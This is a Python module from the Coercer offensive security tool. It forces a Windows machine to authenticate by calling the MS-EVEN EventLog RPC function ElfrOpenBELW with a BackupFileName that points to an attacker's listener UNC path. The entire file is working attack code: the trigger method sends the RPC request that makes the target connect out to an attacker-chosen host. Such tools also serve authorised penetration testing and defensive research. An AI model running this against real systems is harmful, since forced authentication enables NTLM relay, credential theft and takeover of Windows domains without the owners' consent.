#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : ElfrOpenBELW.py
# Author             : Podalirius (@podalirius_)
# Date created       : 11 Dec 2022


from coercer.models.MSPROTOCOLRPCCALL import MSPROTOCOLRPCCALL
from coercer.network.DCERPCSessionError import DCERPCSessionError
from impacket.dcerpc.v5 import even
from impacket.dcerpc.v5.dtypes import NULL


class ElfrOpenBELW(MSPROTOCOLRPCCALL):
    """
    Coercing a machine to authenticate using function [ElfrOpenBELW](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1) (opnum 9) of [MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)

    Method found by:
     - [@evilashz](https://github.com/evilashz/)
    """

    exploit_paths = [
        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\aa')
    ]

    access = {
        "ncan_np": [
            {
                "namedpipe": r"\PIPE\eventlog",
                "uuid": "82273fdc-e32a-18c3-3f78-827929dc23ea",
                "version": "0.0"
            }
        ]
    }

    protocol = {
        "longname": "[MS-EVEN]: EventLog Remoting Protocol",
        "shortname": "MS-EVEN"
    }

    function = {
        "name": "ElfrOpenBELW",
        "opnum": 9,
        "vulnerable_arguments": ["BackupFileName"]
    }

    def trigger(self, dcerpc_session, target):
        if dcerpc_session is not None:
            try:
                self.path = self.path.rstrip('\x00')
                request = even.ElfrOpenBELW()
                request['UNCServerName'] = NULL
                request['BackupFileName'] = self.path
                request['MajorVersion'] = 1
                request['MinorVersion'] = 1
                resp = dcerpc_session.request(request)
                resp.dump()
                return ""
            except Exception as err:
                return err
        else:
            print("[!] Error: dce is None, you must call connect() first.")
            return None
